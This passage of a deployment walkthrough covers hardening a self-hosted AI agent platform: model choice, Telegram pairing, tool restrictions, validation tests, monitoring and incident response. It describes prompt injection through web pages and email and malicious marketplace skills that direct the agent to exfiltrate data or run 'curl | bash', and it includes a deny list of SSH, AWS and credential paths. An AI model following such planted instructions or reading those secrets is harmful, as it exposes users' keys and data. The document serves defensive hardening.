- [ ] D2: Sandbox config applied (mode: all, scope: session, Docker verified)
  - Docker memory impact observed: _______________
  - Fallback needed (session -> agent -> off)? _______________
- [ ] D3: exec-approvals.json created and permissions set to 600
  - Notes: _______________
- [ ] D4: Elevated mode disabled
  - Notes: _______________
- [ ] D5: mDNS disabled (config + environment variable + dns-sd verification)
  - dns-sd result: _______________
- [ ] D6: Tool policy applied (read-only day-1 posture)
  - Notes: _______________
- [ ] D7: Security audit passed (basic + deep + auto-fix)
  - Basic audit result: _______________
  - Deep audit result: _______________
  - Auto-fix applied: _______________
  - Unresolved findings: _______________
- [ ] D8: File permissions locked down (700 directories, 600 files)
  - Verification output: _______________
- [ ] **Gateway restarted** after all config changes
- [ ] **Open Question #3 noted** — monitor Docker memory during Phase G
- [ ] **Open Question #5 noted** — test exec-approvals pattern matching during Phase H

---

## Phase E: Model Configuration

**What we're doing:** Configuring Claude as the LLM provider with the right model, cost controls, and the foundations for model routing.
**Why it matters:** The model choice directly affects both security and cost. Opus is recommended for prompt injection resistance. But API costs can surprise you — community reports of $20-50 on Day 1 are common.
**Time estimate:** 10 minutes.
**Deeper context:** `knowledge-base/02-architecture/deep-dive-findings.md` (Multi-Model Architecture section)

### Understanding: How Model Routing Actually Works

One of the things that surprised us during the Phase 2 architecture deep-dive: OpenClaw's model routing is **failover-based, not intelligent**. It does NOT automatically decide "this is a complex task, use Opus" or "this is a simple task, use Haiku." Instead, you assign a primary model to each agent, and if that model is unavailable (API error, rate limit), it falls through a fallback chain in order. That's it.

This matters for two reasons. First, it means cost optimization is manual — if you want cheaper models for routine tasks, you create separate agents with different models and route messages to them using the bindings system. Second, it means the security recommendation is straightforward: use Claude Opus 4.6 as the primary for everything on Day 1. The official docs explicitly recommend Opus (or the latest flagship) for tool-enabled agents because it's the strongest at recognizing prompt injections. Smaller, cheaper models are "generally more susceptible to tool misuse and instruction hijacking." When an attacker embeds prompt injection in a web page or email, Opus is most likely to recognize it for what it is and refuse to comply.

Cost-wise, expect the first day to be expensive. Community reports suggest 5-15M tokens on Day 1 due to the system prompt, skill loading, initial conversations, and heartbeat activity. At Opus pricing, budget $5-15 for Day 1. After you have usage data from the first week, you can optimize: use Sonnet for heartbeat checks, set active hours to prevent overnight token burn, and prune unused skills to reduce system prompt size.

### E1: Verify API Key and Model Selection

**Concept:** The API key was configured during onboarding (Phase C). This step verifies it's set correctly and the model is what we want.

```bash
# Check current model configuration
openclaw config get agents.defaults.model
# Expected: Should show Claude Opus 4.6 or equivalent

# If you need to set it explicitly:
openclaw config set agents.defaults.model "claude-opus-4-6-20250514"
```

**Expected output:** Model shows as Claude Opus 4.6.

**If something's wrong:**
- If the model is set to something else (Sonnet, Haiku): change it to Opus for Day 1. Cost optimization comes later.
- If the API key is invalid: check the Anthropic console, generate a new key, and update via `openclaw config set`

### E2: Model Routing — Day-1 Simplicity

**Concept:** Day 1 is Opus for everything. No multi-model complexity. The Week 1-2 roadmap introduces cost optimization once you have usage data.

For Day 1, the default configuration from onboarding is sufficient. No changes needed — just verify Opus is the primary model (E1 above).

**Week 1-2 approach (when you're ready to optimize costs):**

```json5
// Per-agent model configuration
{
  "agents": {
    "list": [
      {
        "id": "main",
        "model": "claude-opus-4-6-20250514",      // Primary: Opus for complex/security-sensitive
        "modelFallback": ["claude-sonnet-4-5-20250929"]  // Fallback if Opus unavailable
      }
    ]
  }
}
```

Later, you can create separate agents with cheaper models for heartbeat checks and routine cron jobs. But that's Week 2 — don't over-engineer Day 1.

**Security note:** Do NOT set a weaker model as the primary for your main agent. Opus is recommended specifically for prompt injection resistance. Use Sonnet only for heartbeat, simple cron jobs, and webhook-triggered tasks where the input is controlled.

### E3: Spending Limits and Cost Controls

**Concept:** API costs can escalate quickly, especially in the first few days when you're actively testing. Setting spending limits is a safety net.

**Step 1 — Set limits in the Anthropic Console:**

Go to [console.anthropic.com](https://console.anthropic.com/) > Settings > Limits

Recommended initial limits:
- Daily: $10
- Monthly: $100

Adjust upward as you understand your usage patterns. Better to hit a limit and raise it than to wake up to a surprise bill.

**Step 2 — Configure active hours for heartbeat:**

```json5
{
  "agents": {
    "defaults": {
      "heartbeat": {
        "activeHours": { "start": "08:00", "end": "22:00" }
        // Heartbeat only runs during waking hours — no overnight token burn
      }
    }
  }
}
```

**Other cost reduction tips from the research:**
- Disable skills you don't use (`entries.<key>.enabled: false`) — each active skill adds to the system prompt, which adds tokens per message
- Use `allowBundled` whitelist to load only the skills you actually need (the 53 bundled skills cost ~1,300 tokens/turn if all are loaded)
- Use Sonnet (cheaper) for heartbeat and routine cron jobs via per-cron model override
- Monitor usage daily during the first week: [console.anthropic.com](https://console.anthropic.com/) > Usage

**Expected output:** Spending limits set in the Anthropic console. Active hours configured in `openclaw.json`.

### Phase E — Deployment Notes

*Fill this in during deployment:*

- [ ] Model confirmed as Opus?
- [ ] Spending limits set? Daily: $___ Monthly: $___
- [ ] Active hours configured?
- [ ] Day 1 actual token usage: ___ tokens, $___
- Notes / deviations / surprises:

---

## Phase F: Channel Setup

**What we're doing:** Connecting Telegram and verifying you can access the Gateway UI — making the agent reachable from the outside world.
**Why it matters:** This is the moment of truth. Everything before this was preparation. The security hardening in Phase D exists specifically to make this step safe.
**Time estimate:** 10-15 minutes.

### F1: Telegram Setup

**Concept:** Telegram bots are lightweight — they're just an API endpoint that Telegram routes messages to. You create the bot via @BotFather (Telegram's built-in bot management tool), get a token, and configure OpenClaw to listen for messages on that bot. The community consensus is that Telegram is the best first channel for OpenClaw: it works from phone and desktop, supports rich formatting, and has a robust bot API.

**Step 1 — Create the bot (if not done during pre-flight):**

1. Open Telegram on your phone or desktop
2. Search for and message **@BotFather**
3. Send `/newbot`
4. Follow the prompts to name your bot (e.g., "Sean's ClawdBot")
5. Copy the bot token (looks like `123456789:ABCdefGHIjklMNOpqrSTUvwxyz`)

**Step 2 — Get your Telegram user ID:**

1. Search for and message **@userinfobot** on Telegram
2. It replies immediately with your numeric user ID (looks like `123456789`)

**Step 3 — Configure in openclaw.json:**

```json5
{
  "channels": {
    "telegram": {
      "enabled": true,
      "botToken": "YOUR_TELEGRAM_BOT_TOKEN",
      "allowFrom": "YOUR_TELEGRAM_USER_ID",
      "dmPolicy": "pairing",
      "groups": {
        "*": { "requireMention": true }
      },
      "actions": {
        "reactions": true,
        "sendMessage": true,
        "deleteMessage": false,
        "sticker": false
      }
    }
  }
}
```

The `allowFrom` field restricts who can initiate conversations. Combined with `dmPolicy: "pairing"` from Phase D, this means: only you can message the bot, and even then you need to pair first.

The `actions` block controls what the bot can do in Telegram. We enable reactions and sending messages, but disable deleting messages (you want a record of everything) and stickers (unnecessary).

**Step 4 — Restart the gateway and pair:**

```bash
# Restart the gateway to pick up channel config
launchctl kickstart -k gui/$UID/bot.molt.gateway

# In Telegram, open the chat with your bot and send:
# /start
# The bot should respond with a pairing prompt
# Confirm the pairing
```

**Step 5 — Verify it works:**

Send a test message to the bot. Something simple like "Hello, are you there?" — it should respond.

**If something's wrong:**
- Bot doesn't respond at all: check gateway logs — `cat /tmp/openclaw/openclaw-$(date +%Y-%m-%d).log | tail -50`
- "Unauthorized" errors in logs: verify the bot token is correct (no extra spaces, complete token)
- "Not paired" errors: make sure you sent `/start` and confirmed pairing
- Gateway not running after restart: check `launchctl list | grep molt`

### F2: Gateway UI Access via Tailscale

**Concept:** The Gateway Control UI is a web dashboard for managing agents, viewing sessions, and monitoring activity. Since our gateway is bound to loopback (localhost only), you can't access it from another machine directly. Tailscale Serve creates a secure HTTPS endpoint that only your Tailscale devices can reach — no port forwarding, no exposing anything to the internet.

```bash
# From the Mac Mini, create a Tailscale Serve endpoint for the gateway
tailscale serve --bg 18789
# This makes the gateway UI available at:
# https://mac-mini-openclaw.tail12345.ts.net
# (Your actual Tailscale hostname will be different)
```

**From your laptop (on the same Tailscale network):**

Open a browser and navigate to your Mac Mini's Tailscale HTTPS URL. You should see the Gateway Control UI.

**Verify you can:**
1. Load the Gateway UI in your browser
2. See the agent status (should show "running")
3. See connected channels (Telegram should show as connected)

**If something's wrong:**
- Can't reach the URL: verify Tailscale is connected on both machines (`tailscale status`)
- Auth errors: this is Open Question #8 — the `gateway.auth.allowTailscale` setting may need to be configured for Serve identity headers. Try accessing with the gateway auth token in the header if basic access fails.

### Phase F — Deployment Notes

*Fill this in during deployment:*

- [ ] Telegram bot created? Bot name: ___
- [ ] Bot token configured?
- [ ] User ID configured?
- [ ] Pairing successful?
- [ ] First test message received and responded?
- [ ] Gateway UI accessible via Tailscale?
- [ ] Open Question #8 (Tailscale Serve auth): ___
- Notes / deviations / surprises:

---

## Phase G: Starter Skills & First Run

**What we're doing:** Configuring the Day-1 capabilities, running your first real conversations, and establishing monitoring baselines.
**Why it matters:** This is where the agent starts doing actual work. The capability set is intentionally minimal — read-only tools, web search, and reactions. You're observing behavior before granting more power.
**Time estimate:** 20-30 minutes (including the test sequence).
**Deeper context:** `knowledge-base/05-skills-and-integrations/recommended-starter-skills.md`

### Understanding: What Skills Actually Are (and Why ClawHub Is Dangerous)

Here's something that trips people up about OpenClaw: **skills are not code**. A skill is a Markdown file (`SKILL.md`) with YAML frontmatter that teaches the agent how to use its tools for a specific purpose. When a skill is loaded, its instructions become part of the agent's system prompt. The skill doesn't execute anything directly — it gives the agent instructions, and the agent uses its tools to follow those instructions.

This is both elegant and terrifying. Elegant because you can build capabilities by writing English-language instructions. Terrifying because a malicious skill can instruct the agent to exfiltrate data, execute destructive commands, or phone home to an attacker's server — and the agent will follow those instructions because they look like legitimate skill instructions.

The ClawHub marketplace (OpenClaw's community skill repository) was audited by Koi Security in January 2026. Their "ClawHavoc" report found **341 malicious skills out of 2,857** — a 12% malicious rate. Attack techniques included ClickFix lures, typosquatting (naming a malicious skill nearly identically to a popular one), reputation washing, base64-encoded commands, and `curl | bash` patterns. Academic research from arXiv independently found that 26% of agent skills across the LLM ecosystem contain at least one vulnerability.

This is why we use **zero ClawHub skills**. Our Day-1 capabilities come from OpenClaw's 53 bundled skills (reviewed by the OpenClaw team) and the built-in tools configured in Phase D. If we need custom functionality later, we write our own Markdown skills — fully auditable, zero supply chain risk. See `patterns/001-zero-clawhub-supply-chain-defense.md` for the full rationale.

### G1: Day-1 Skills Configuration

**Concept:** The tool policy from Phase D already defines what the agent can and can't do. This step configures the web search tool (which needs an API key) and the filesystem restrictions (which paths the agent can read).

**Configure web search with Brave API:**

```json5
{
  "tools": {
    "web": {
      "search": {
        "enabled": true,
        "provider": "brave",
        "apiKey": "YOUR_BRAVE_SEARCH_API_KEY"
      },
      "fetch": {
        "enabled": true,
        "maxChars": 50000,
        "timeoutSeconds": 30
      }
    }
  }
}
```

**Configure filesystem restrictions:**

```json5
{
  "sandbox": {
    "filesystem": {
      "allow": ["~/.openclaw/workspace"],
      "deny": ["~/.ssh", "~/.aws", "~/.openclaw/credentials", "~/.openclaw/openclaw.json", "~/.openclaw/exec-approvals.json"]
    }
  }
}
```

The `deny` list is important — even though the `read` tool is allowed, these paths are off-limits. The agent should never read your SSH keys, AWS credentials, or its own configuration files (which contain API keys and tokens).

**Expected output:** No command to run — these are config file edits. Restart the gateway after making changes.

### G2: Heartbeat Configuration

**Concept:** The heartbeat is the agent's periodic check-in. It wakes up at the configured interval, runs through a checklist you define in `HEARTBEAT.md`, and reports back. Think of it as a cron job for the agent's consciousness — it prevents the agent from going completely silent between conversations and gives you a regular "is it alive?" signal.

```json5
{
  "agents": {
    "defaults": {
      "heartbeat": {
        "every": "60m",
        "target": "last",
        "activeHours": { "start": "08:00", "end": "22:00" }
      }
    }
  }
}
```

- `every: "60m"` — checks in every hour
- `target: "last"` — continues the most recent conversation rather than starting a new one
- `activeHours` — only runs during waking hours (already set in Phase E)

Create the heartbeat checklist:

```bash
# Create the heartbeat instruction file
cat > ~/.openclaw/HEARTBEAT.md << 'EOF'
# Heartbeat Checklist

- If idle for 8+ hours during active hours, send a brief check-in to Telegram
- Report any errors encountered since last heartbeat
EOF
```

Start minimal. Expand the checklist after you observe the agent's behavior for a few days. Don't overthink it on Day 1.

**Expected output:** File created at `~/.openclaw/HEARTBEAT.md`.

### G3: First Conversation Test

**Concept:** This is a structured test sequence to verify the full pipeline works. Each test validates a different layer: basic LLM connectivity, web search, file reading, and (critically) that permission boundaries hold.

Run these tests via Telegram:

**Test 1 — Basic response:**
Send: "Hello, what model are you running?"
Expected: Agent responds with model identification (should say Opus)
Validates: Telegram → Gateway → Agent → Anthropic API → Response → Telegram

**Test 2 — Web search:**
Send: "Search the web for today's weather in [your city]"
Expected: Agent uses `web_search` tool and returns results
Validates: Brave Search API key works, web_search tool is allowed

**Test 3 — File read:**
Send: "Read the file at ~/.openclaw/HEARTBEAT.md"
Expected: Agent reads and returns the heartbeat checklist content
Validates: `read` tool works, filesystem access within allowed paths

**Test 4 — Permission boundary (write):**
Send: "Create a file called test.txt with the contents 'hello'"
Expected: Agent should **REFUSE** — `write` tool is denied in Day-1 config
Validates: Tool deny list is enforced

**Test 5 — Permission boundary (exec):**
Send: "Run the command ls -la ~/"
Expected: Agent should **REFUSE** — `exec` tool is denied in Day-1 config
Validates: Exec deny is enforced

**Document each test result.** If Tests 4 or 5 succeed (agent writes a file or executes a command), your tool policy from Phase D is not working. Stop and investigate before proceeding.

### G4: Token Usage Monitoring

**Concept:** Check how much the first conversations cost. Initial conversations are token-heavy because the system prompt includes all loaded skills and configuration context.

```bash
# Check token usage in the Anthropic Console:
# https://console.anthropic.com/ > Usage

# Also check locally if available:
openclaw usage
```

**Expected Day-1 usage:** 5-15M tokens depending on conversation volume and how much you test. At Opus pricing, that's $5-15.

**If costs are higher than expected:**
- Reduce heartbeat frequency (every 120m instead of 60m)
- Prune bundled skills with `allowBundled` whitelist
- Use `/model sonnet` for casual conversations (switch back to Opus for anything security-sensitive)

### Phase G — Deployment Notes

*Fill this in during deployment:*

- [ ] Brave Search API configured?
- [ ] Filesystem restrictions configured?
- [ ] Heartbeat configured and HEARTBEAT.md created?
- [ ] Test 1 (basic response): PASS / FAIL — Notes: ___
- [ ] Test 2 (web search): PASS / FAIL — Notes: ___
- [ ] Test 3 (file read): PASS / FAIL — Notes: ___
- [ ] Test 4 (write denied): PASS / FAIL — Notes: ___
- [ ] Test 5 (exec denied): PASS / FAIL — Notes: ___
- [ ] Token usage after testing: ___ tokens, $___
- [ ] Docker memory usage observed (Open Question #3): ___
- Notes / deviations / surprises:

---

## Phase H: Validation

**What we're doing:** Systematically verifying that every security hardening measure actually works. Not "should work" — *does* work, with evidence.
**Why it matters:** Configuration files can have typos. Services can fail to restart. Settings can be overridden. The only way to know your security posture is to test it.
**Time estimate:** 20-30 minutes.

This phase is NOT optional. Every check below needs a result — PASS or FAIL, with the actual output documented.

### H1: 10 Mandatory Security Conditions

These are the 10 conditions from our security evaluation report. All must pass.

| # | Condition | Verification | Expected |
|---|-----------|-------------|----------|
| 1 | Version >= v2026.1.29 | `openclaw --version` | >= 2026.1.29 |
| 2 | Gateway bound to loopback | `curl http://127.0.0.1:18789/health` (should WORK) then `curl http://<your-LAN-IP>:18789/health` (should FAIL) | Localhost: 200, LAN: Connection refused |
| 3 | Gateway auth token set | `curl -s http://127.0.0.1:18789/health` without token header | Should return 401/403 |
| 4 | Sandbox mode is "all" | `openclaw config get agents.defaults.sandbox.mode` | `"all"` |
| 5 | Elevated mode disabled | `openclaw config get tools.elevated.enabled` | `false` |
| 6 | ClawHub skills: zero | `ls ~/.openclaw/extensions/` | Empty (no third-party skills) |
| 7 | FileVault enabled | `sudo fdesetup status` | "FileVault is On." |
| 8 | SIP enabled | `csrutil status` | "System Integrity Protection status: enabled." |
| 9 | mDNS disabled | `dns-sd -B _openclaw-gw._tcp` (wait 10s, then Ctrl+C) | No results |
| 10 | File permissions locked | `ls -la ~/.openclaw/openclaw.json` | `-rw-------` (600) |

**Additional checks:**

```bash
# DM policy is pairing
openclaw config get channels.telegram.dmPolicy
# Expected: "pairing"

# Tailscale is running
tailscale status
# Expected: Connected

# macOS firewall is on
/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
# Expected: "Firewall is enabled."
```

### H2: Functional Validation

Beyond security, verify the system actually works reliably:

```bash
# Verify gateway survives restart
launchctl kickstart -k gui/$UID/bot.molt.gateway
sleep 10
curl -s http://127.0.0.1:18789/health
# Expected: Healthy after restart
```

**Reboot test (important):**

```bash
# Verify gateway survives a full system reboot
sudo shutdown -r now
# After reboot, SSH back in and verify:
launchctl list | grep molt
curl -s http://127.0.0.1:18789/health
# Send a test message via Telegram to confirm full pipeline works
```

If the gateway doesn't come back after reboot, the LaunchAgent isn't configured correctly. Check `launchctl print gui/$UID/bot.molt.gateway` for errors.

**Wait for the next heartbeat** — confirm it fires and you receive a check-in message in Telegram.

### H3: Test the 6 Deployment Blockers

These are the items from our open questions report that could only be resolved through hands-on testing. Document each one:

**Blocker 1 — CVE patch verification:**
Already verified in Phase C. Re-verify: `openclaw --version` >= 2026.1.29.

**Blocker 2 — macOS Keychain behavior:**
By now you've been through Phases C-G. Did any Keychain or TCC dialogs appear?
```bash
# Check Console.app for Keychain-related log entries from the past hour
log show --predicate 'subsystem == "com.apple.securityd"' --last 1h
```
Document what happened (or didn't happen).

**Blocker 3 — Docker sandbox on Apple Silicon:**
If you configured Docker sandbox in Phase D:
```bash
# Check Docker resource usage
docker stats --no-stream
# Check overall system memory
vm_stat | head -10
```
Document: Is Docker consuming too much memory? Did you need to fall back from per-session to per-agent scope?

**Blocker 4 — launchd + dedicated user:**
You already know the answer. Did the LaunchAgent work under the `openclaw` user, or did you fall back to your admin account? Document the outcome.

**Blocker 5 — exec-approvals pattern matching:**
This can only be tested when `exec` is eventually enabled (Week 1-2). For now, note that it's deferred and plan to test it then with harmless commands like:
- `echo hello` (should be allowed if `/bin/echo` is in allowlist)
- `sudo echo hello` (should be DENIED)
- Document which patterns catch variations

**Blocker 6 — Backup encryption:**
```bash
# Check Time Machine encryption status
# System Settings > General > Time Machine > Options
# Verify "Encrypt backups" is checked

# If using an external drive, verify encryption:
diskutil apfs list | grep -A5 "Volume"
# Look for "FileVault: Yes" on the backup volume
```

### Phase H — Deployment Notes

*Fill this in during deployment — this is the most important deployment notes section:*

**Security Conditions:**
- [ ] Condition 1 (version): PASS / FAIL — Actual: ___
- [ ] Condition 2 (loopback): PASS / FAIL — Actual: ___
- [ ] Condition 3 (auth): PASS / FAIL — Actual: ___
- [ ] Condition 4 (sandbox): PASS / FAIL — Actual: ___
- [ ] Condition 5 (elevated): PASS / FAIL — Actual: ___
- [ ] Condition 6 (no ClawHub): PASS / FAIL — Actual: ___
- [ ] Condition 7 (FileVault): PASS / FAIL — Actual: ___
- [ ] Condition 8 (SIP): PASS / FAIL — Actual: ___
- [ ] Condition 9 (mDNS): PASS / FAIL — Actual: ___
- [ ] Condition 10 (permissions): PASS / FAIL — Actual: ___

**Functional:**
- [ ] Gateway restart survival: PASS / FAIL
- [ ] Full reboot survival: PASS / FAIL
- [ ] Heartbeat fired: PASS / FAIL

**Deployment Blockers:**
- [ ] Blocker 1 (CVE patch): Resolved? ___
- [ ] Blocker 2 (Keychain): What happened? ___
- [ ] Blocker 3 (Docker): Memory impact? ___
- [ ] Blocker 4 (launchd user): Which user? ___
- [ ] Blocker 5 (exec-approvals): Deferred to Week 1-2
- [ ] Blocker 6 (backup encryption): Verified? ___

---

## Phase I: Post-Deployment

**What we're doing:** Setting up ongoing monitoring, backups, and documentation so the system stays healthy after Day 1.
**Why it matters:** Deployment isn't the finish line — it's the starting line. An unmonitored agent with stale security is worse than no agent.
**Time estimate:** 15-20 minutes.

### I1: Monitoring Setup

**Concept:** Monitoring is manual for Day 1. You're building habits, not automating yet. These are the commands to run regularly to check that everything is healthy.

**Daily checks:**

```bash
# Is the gateway running?
launchctl list | grep molt

# Is it healthy?
curl -s http://127.0.0.1:18789/health

# Anything weird in today's logs?
cat /tmp/openclaw/openclaw-$(date +%Y-%m-%d).log | tail -100

# Any unexpected tool calls?
grep -i "tool" /tmp/openclaw/openclaw-$(date +%Y-%m-%d).log | tail -20
```

**Weekly checks:**

```bash
# Full security audit
openclaw security audit --deep

# Any OpenClaw updates available?
npm outdated -g openclaw

# Review session transcripts for anomalies
ls -la ~/.openclaw/agents/*/sessions/*.jsonl

# How much disk space is OpenClaw using?
du -sh ~/.openclaw/
```

**Monthly checks:**

```bash
# Rotate the gateway auth token
openclaw doctor --generate-gateway-token
# Update the token in openclaw.json after rotation

# Check for new CVEs
# Search: https://nvd.nist.gov/vuln/search?query=openclaw

# Review old session transcripts (keep last 30 days)
find ~/.openclaw/agents/*/sessions/ -name "*.jsonl" -mtime +30 -exec ls -la {} \;
# Review before deleting — do NOT auto-delete without checking
```

You don't need to memorize these — they're also in the operational runbook template (`knowledge-base/07-operations/operational-runbook-template.md`) and the research cadence (`knowledge-base/07-operations/research-cadence.md`).

### I2: Backups

**Concept:** The `~/.openclaw/` directory contains everything — credentials, config, session history, agent data. Losing it means starting from scratch. We use two backup strategies: Time Machine for everything (encrypted), and git for configuration files only (no secrets).

**Strategy 1 — Time Machine (encrypted):**

```bash
# Verify Time Machine is configured with encryption
# System Settings > General > Time Machine
# Ensure "Encrypt backups" is checked
# Connect an external drive or network backup destination
```

Time Machine captures everything, including credentials and session transcripts. The encryption ensures that a stolen backup drive doesn't expose your API keys and chat history.

**Strategy 2 — Configuration as code (git):**

```bash
# Create a git repo for OpenClaw configuration (NOT credentials)
mkdir -p ~/openclaw-config-backup && cd ~/openclaw-config-backup
git init

# Create a backup script
cat > backup-config.sh << 'BACKUP_EOF'
#!/bin/bash
# Backup OpenClaw configuration (excluding credentials and session data)
BACKUP_DIR="$HOME/openclaw-config-backup"
cp ~/.openclaw/openclaw.json "$BACKUP_DIR/"
cp ~/.openclaw/exec-approvals.json "$BACKUP_DIR/"
cp ~/.openclaw/HEARTBEAT.md "$BACKUP_DIR/" 2>/dev/null
mkdir -p "$BACKUP_DIR/agents"
# Copy agent configs (not session data)
find ~/.openclaw/agents -name "*.json" -not -path "*/sessions/*" -exec cp {} "$BACKUP_DIR/agents/" \;
cd "$BACKUP_DIR"
git add -A
git commit -m "Config backup $(date +%Y-%m-%d-%H%M)"
BACKUP_EOF
chmod +x backup-config.sh

# Run it after any config change
./backup-config.sh
```

**What goes where:**
- **Time Machine:** Everything (encrypted, includes credentials and transcripts)
- **Git repo:** Configuration only (no API keys, no tokens, no session data)
- **Neither:** Never put API keys in a git repo, even a local one

### I3: Document What Actually Happened

**Concept:** This walkthrough was written based on research. Now you've done the actual deployment. The gap between "what we planned" and "what actually happened" is the most valuable intelligence the project can capture.

After completing all phases, take 10 minutes to write a brief post-deployment summary. The key things to capture:

1. **Actual version installed** (and was it >= 2026.1.29?)
2. **Which open questions were resolved** (and what were the answers?)
3. **Any unexpected issues** (things the research didn't predict)
4. **TCC/Keychain dialogs observed** (for Open Question #2)
5. **Docker sandbox: used or skipped** (and why)
6. **Actual resource usage** (RAM, CPU, disk)
7. **Time to complete deployment** (vs our 2-3 hour estimate)
8. **Deviations from this walkthrough** (what you did differently and why)

This goes into `knowledge-base/07-operations/post-deployment-findings.md` — feeding back into the research knowledge base.

### Phase I — Deployment Notes

*Fill this in during deployment:*

- [ ] Daily monitoring commands tested?
- [ ] Weekly security audit tested?
- [ ] Time Machine configured and encrypting?
- [ ] Config backup git repo created?
- [ ] Post-deployment findings documented?
- Notes / deviations / surprises:

---

## After Deployment

### Verification Checklist

One final review — confirm all of these before considering deployment "done":

- [ ] OpenClaw version >= 2026.1.29
- [ ] Non-admin user running gateway (or documented fallback)
- [ ] FileVault enabled and encrypting
- [ ] exec-approvals.json configured with denylist
- [ ] Sandbox mode "all" with Docker (or documented fallback)
- [ ] Elevated mode disabled
- [ ] All 10 mandatory security conditions passed
- [ ] All 6 deployment blockers tested and documented
- [ ] First conversation completed successfully
- [ ] Gateway survives reboot
- [ ] Heartbeat fires on schedule
- [ ] Monitoring commands work
- [ ] Backups configured

### Report Back

When deployment is done (or stuck), check back in with:

- **What phase you completed through** (A-I, or where you stopped)
- **Any deviations from the walkthrough** (what you did differently)
- **Open questions that were resolved** (and the answers)
- **New questions that came up** (things we didn't anticipate)
- **Anything that surprised you**

We'll update the project together:
- `activity-log.md` — what happened
- `intelligence-log.md` — what we learned
- `CONTEXT.md` — current state
- This walkthrough — annotate with "what actually happened"
- `knowledge-base/07-operations/post-deployment-findings.md` — detailed findings

The living system continues.

---

## Appendix

### Key File Locations

| File | Purpose |
|------|---------|
| `~/.openclaw/openclaw.json` | Main configuration (gateway, agents, channels, tools, sandbox) |
| `~/.openclaw/exec-approvals.json` | Command execution allowlist/denylist |
| `~/.openclaw/HEARTBEAT.md` | Heartbeat checklist |
| `~/.openclaw/credentials/` | API keys and OAuth tokens |
| `~/.openclaw/agents/<agentId>/` | Per-agent configuration and state |
| `~/.openclaw/agents/<agentId>/sessions/*.jsonl` | Session transcripts (sensitive) |
| `~/.openclaw/extensions/` | Installed skills/extensions (should be empty) |
| `~/.openclaw/sandboxes/` | Sandbox workspace data |
| `~/Library/LaunchAgents/bot.molt.gateway.plist` | launchd service configuration |
| `/tmp/openclaw/openclaw-YYYY-MM-DD.log` | Gateway log files |
| `/etc/pf.anchors/openclaw.rules` | macOS firewall rules |

### Key Commands Reference

```bash
# Gateway management
openclaw gateway install              # Install LaunchAgent
openclaw gateway uninstall            # Remove LaunchAgent
launchctl list | grep molt            # Check if running
launchctl kickstart -k gui/$UID/bot.molt.gateway  # Restart gateway
launchctl bootout gui/$UID/bot.molt.gateway        # Stop gateway

# Security
openclaw security audit               # Basic security audit
openclaw security audit --deep         # Deep audit with live probes
openclaw security audit --fix          # Auto-fix common issues
openclaw --version                     # Check installed version

# Configuration
openclaw config get <key>              # Read a config value
openclaw config set <key> <value>      # Set a config value
openclaw doctor                        # Health check
openclaw doctor --generate-gateway-token  # Generate new auth token

# Monitoring
openclaw usage                         # Token usage statistics
openclaw skills list                   # List installed skills

# In-conversation
/model <model-name>                    # Switch model during conversation
```

### Emergency Procedures

**If compromise is suspected:**

```bash
# 1. CONTAIN — Stop the gateway immediately
launchctl bootout gui/$UID/bot.molt.gateway

# 2. FREEZE — Disable all inbound surfaces
# Edit ~/.openclaw/openclaw.json:
# Set all channel configs to: "enabled": false

# 3. ROTATE — Assume ALL secrets are compromised
# - Regenerate gateway auth token (openclaw doctor --generate-gateway-token)
# - Revoke and regenerate Anthropic API key (console.anthropic.com)
# - Revoke and regenerate Telegram bot token (@BotFather > /revoke)
# - Revoke and regenerate Brave Search API key
# - Change Tailscale auth keys if applicable

# 4. AUDIT
# Check logs:
cat /tmp/openclaw/openclaw-*.log | grep -i "error\|warn\|exec\|tool"
# Review recent session transcripts:
ls -lt ~/.openclaw/agents/*/sessions/*.jsonl | head -10
# Check for unauthorized config changes:
diff ~/.openclaw/openclaw.json ~/openclaw-config-backup/openclaw.json
# Check for unexpected extensions:
ls -la ~/.openclaw/extensions/

# 5. DOCUMENT
# Record: timestamp, OS version, OpenClaw version, what happened,
# what the attacker sent, what the agent did, whether gateway was
# exposed beyond loopback
```

**If gateway won't start after reboot:**

```bash
# Check if LaunchAgent plist exists
ls -la ~/Library/LaunchAgents/bot.molt.gateway.plist

# Check launchd error
launchctl print gui/$UID/bot.molt.gateway

# Try manual start
openclaw gateway start

# Check logs for errors
cat /tmp/openclaw/openclaw-$(date +%Y-%m-%d).log | tail -50

# Nuclear option: reinstall LaunchAgent
openclaw gateway uninstall && openclaw gateway install
```

**If locked out of the Mac Mini:**

```bash
# From your primary Mac (via Tailscale SSH):
ssh openclaw@<mac-mini-tailscale-ip>

# If Tailscale SSH fails:
# 1. Physical access: connect keyboard/monitor
# 2. Recovery mode: hold power button on boot > Terminal
# 3. Last resort: reinstall macOS (FileVault recovery key needed)
```

### Week 1-2 Roadmap

This is NOT part of Day-1 deployment. These are the next steps after Day 1 is validated and stable.

| Day | Action | Prerequisite |
|-----|--------|-------------|
| Day 2-3 | Monitor logs, token usage, resource consumption | Day 1 complete |
| Day 3-4 | Enable `exec` tool with strict exec-approvals allowlist | Comfortable with agent behavior |
| Day 4-5 | Enable `write` and `edit` tools with filesystem restrictions | exec working correctly |
| Day 5-7 | Configure first cron job (morning briefing) | write tools working |
| Week 1 | Enable memory plugin (LanceDB) | Comfortable with tool behavior |
| Week 1 | Build first custom skill (personal briefing) | Cron + write working |
| Week 2 | Configure model routing (Sonnet for heartbeat, Opus for work) | Cost data from Week 1 |
| Week 2 | Build research assistant custom skill | First custom skill working |
| Week 2 | Evaluate Tailscale Serve integration (Open Question #8) | Basic deployment stable |
| Week 3+ | Lobster workflow runtime, webhooks, n8n integration | All Week 1-2 items stable |

### What This Walkthrough Does NOT Cover

These are deferred to future phases:
- **n8n installation** — Deterministic workflow automation (Phase 2 of the stack)
- **Langfuse** — LLM observability (Phase 3 of the stack)
- **Custom skill development** — Writing your own SKILL.md files
- **Multi-agent architecture** — Multiple agents with different permissions
- **Reader agent pattern** — Advanced prompt injection defense for untrusted content
- **Browser automation** — Indefinitely deferred due to critical attack surface
- **ClawShield** — Third-party hardening tool (test after base deployment is stable)
- **nono kernel sandbox** — Likely Linux-only (uses Landlock LSM)

### Sources That Informed This Walkthrough

This walkthrough synthesizes findings from 130+ sources across 4 credibility tiers. Full source index: `research/sources.md`

| Key Source | Contribution |
|-----------|-------------|
| `knowledge-base/04-deployment/mac-mini-deployment-plan.md` | Every command, expected outcome, and citation |
| `knowledge-base/03-security/security-posture-analysis.md` | Security rationale for every hardening step |
| `knowledge-base/02-architecture/deep-dive-findings.md` | Architecture concepts for Understanding sections |
| `knowledge-base/05-skills-and-integrations/recommended-starter-skills.md` | Phased capability roadmap |
